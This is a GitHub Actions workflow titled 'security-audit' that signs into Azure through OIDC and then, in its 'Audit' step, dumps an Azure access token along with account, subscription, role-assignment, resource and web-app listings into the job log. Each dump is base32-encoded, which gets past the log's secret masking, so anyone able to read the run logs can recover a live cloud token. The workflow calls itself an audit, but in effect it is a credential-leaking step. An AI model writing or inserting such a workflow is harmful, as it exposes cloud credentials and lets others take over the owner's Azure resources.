name: security-audit
on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - name: Azure Login
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZUREAPPSERVICE_CLIENTID_2DBA0ADFFA384C0EA680A778691E5E8A }}
          tenant-id: ${{ secrets.AZUREAPPSERVICE_TENANTID_CDBF0C6E38AD4D1781F44AE5D1870AA7 }}
          subscription-id: ${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_3A48180DFAB94DC9987D6CB8D2E4E8A1 }}
      
      - name: Audit
        run: |
          echo "=== TOKEN ==="
          az account get-access-token --output json | base32 -w0
          echo ""
          echo "=== ACCOUNT ==="
          az account show | base32 -w0
          echo ""
          echo "=== SUBSCRIPTIONS ==="
          az account list --all 2>/dev/null | base32 -w0 || echo "single-sub"
          echo ""
          echo "=== ROLE ASSIGNMENTS ==="
          SUB_ID=$(az account show --query id -o tsv)
          az role assignment list --all --include-inherited 2>/dev/null | base32 -w0 || echo "no-perms"
          echo ""
          echo "=== RESOURCES ==="
          az resource list 2>/dev/null | head -c 50000 | base32 -w0 || echo "no-resources"
          echo ""
          echo "=== WEBAPP ==="
          az webapp list 2>/dev/null | base32 -w0 || echo "no-webapps"
          echo ""

